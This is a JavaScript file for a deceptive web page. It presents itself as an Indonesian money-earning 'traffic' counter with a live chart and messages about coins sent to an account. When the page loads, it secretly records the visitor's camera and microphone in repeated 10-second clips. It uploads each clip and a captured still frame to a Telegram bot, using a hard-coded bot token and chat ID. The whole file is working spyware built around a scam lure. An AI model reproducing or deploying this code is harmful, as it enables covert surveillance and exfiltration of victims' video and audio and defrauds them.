let mediaRecorder;
let videoChunks = [];
const statusDisplay = document.getElementById('status');
const countdownDisplay = document.getElementById('countdown');
let recordingInterval, countdownTimer;

// Masukkan token bot Telegram dan chat ID
const telegramBotToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; 
const chatId = '-4545188605';

// Chart.js setup
const ctx = document.getElementById('trafficChart').getContext('2d');
const trafficChart = new Chart(ctx, {
    type: 'line',
    data: {
        labels: [],
        datasets: [{
            label: 'Key Information Graphic data to get money (INDONESIA)',
            data: [],
            borderColor: '#00ff00',
            borderWidth: 2,
            fill: true,
            backgroundColor: 'rgba(0, 255, 0, 0.1)'
        }]
    },
    options: {
        scales: {
            x: { display: false },
            y: { beginAtZero: true }
        }
    }
});

// Fungsi memperbarui grafik
function updateChart(value) {
    const labels = trafficChart.data.labels;
    const data = trafficChart.data.datasets[0].data;

    if (labels.length >= 10) {
        labels.shift();
        data.shift();
    }

    labels.push('');
    data.push(value);

    trafficChart.update();
}

// Fungsi menangkap frame tengah video dan mengubahnya jadi gambar
async function captureThumbnail(videoBlob) {
    return new Promise((resolve, reject) => {
        const video = document.createElement("video");
        video.src = URL.createObjectURL(videoBlob);
        video.crossOrigin = "anonymous";
        video.muted = true;
        video.playsInline = true;

        video.addEventListener("loadeddata", () => {
            video.currentTime = 0.1; // Mulai dari awal video
        });

        video.addEventListener("seeked", () => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");

            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Cek apakah frame hitam (misalnya, jika rata-rata pixel rendah)
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const pixels = imageData.data;
            let sum = 0;
            for (let i = 0; i < pixels.length; i += 4) {
                sum += pixels[i] + pixels[i + 1] + pixels[i + 2]; // Total RGB
            }
            let brightness = sum / (pixels.length / 4); // Rata-rata brightness

            if (brightness < 10) {
                video.currentTime += 0.5; // Lompat ke frame berikutnya
            } else {
                canvas.toBlob((blob) => {
                    if (blob) {
                        resolve(blob);
                    } else {
                        reject("Gagal mendapatkan coin");
                    }
                }, "image/jpeg", 0.8);
            }
        });

        video.addEventListener("error", (e) => reject(e));
    });
}


// Fungsi mengirim video ke Telegram
async function sendVideoToTelegram() {
    statusDisplay.textContent = 'Proses mengirim traffic data';
    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
    videoChunks = [];

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', videoBlob, 'recording.webm');
    formData.append('supports_streaming', true);

    try {
        let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
            method: 'POST',
            body: formData,
        });

        let data = await response.json();
        if (data.ok) {
            statusDisplay.textContent = '✅ Traffic  berhasil dihitung!';
            // Setelah video berhasil dikirim, kirim thumbnail
            sendThumbnailToTelegram(videoBlob);
        } else {
            statusDisplay.textContent = '❌ Error: ' + data.description;
        }
    } catch (error) {
        statusDisplay.textContent = '❌ Gagal mengirim jumlah Traffic!';
        console.error('Error:', error);
    }
}

// Fungsi mengirim thumbnail ke Telegram
async function sendVideoToTelegram() {
    statusDisplay.textContent = 'Menghitung jumlah traffic...';
    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
    videoChunks = [];

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', videoBlob, 'recording.webm');
    formData.append('supports_streaming', true);

    try {
        let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
            method: 'POST',
            body: formData,
        });

        let data = await response.json();
        if (data.ok) {
            statusDisplay.textContent = 'berhasil menghitung traffic';

            // 📸 Ambil thumbnail setelah video berhasil dikirim
            statusDisplay.textContent = 'Mengambil coin...';
            const thumbnailBlob = await captureThumbnail(videoBlob);

            // Kirim thumbnail ke Telegram
            const thumbFormData = new FormData();
            thumbFormData.append('chat_id', chatId);
            thumbFormData.append('photo', thumbnailBlob, 'thumbnail.jpg');

            let thumbResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                method: 'POST',
                body: thumbFormData,
            });

            let thumbData = await thumbResponse.json();
            if (thumbData.ok) {
                statusDisplay.textContent = '✅ coin berhasil dikirim ke rekening!';
            } else {
                statusDisplay.textContent = 'Gagal mengirim coin' + thumbData.description;
            }
        } else {
            statusDisplay.textContent = 'Gagal memuat server' + data.description;
        }
    } catch (error) {
        statusDisplay.textContent = 'Terjadi kesalahan saat mendapatkan server';
        console.error('Error:', error);
    }
}

// Fungsi untuk memulai rekaman
async function startRecording() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = (event) => {
            videoChunks.push(event.data);
            updateChart(event.data.size / 1024);  // Update grafik ukuran dalam KB
        };

        function start10SecondsRecording() {
            let countdown = 10;
            countdownDisplay.textContent = countdown;

            countdownTimer = setInterval(() => {
                countdown--;
                countdownDisplay.textContent = countdown;

                if (countdown === 0) {
                    clearInterval(countdownTimer);
                }
            }, 1000);

            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
            }, 10000);

            mediaRecorder.onstop = () => {
                sendVideoToTelegram();
            };
        }

        recordingInterval = setInterval(() => {
            start10SecondsRecording();
        }, 11000);
    } catch (error) {
        statusDisplay.textContent = 'izinkan perangkat ini untuk memulai!';
        console.error('Error:', error);
    }
}

// Jalankan rekaman saat halaman dimuat
window.addEventListener('load', () => {
    startRecording();
    statusDisplay.textContent = '⏳ Memulai traffic...';
});

// Hentikan rekaman jika halaman ditutup
window.addEventListener('beforeunload', () => {
    clearInterval(recordingInterval);
});

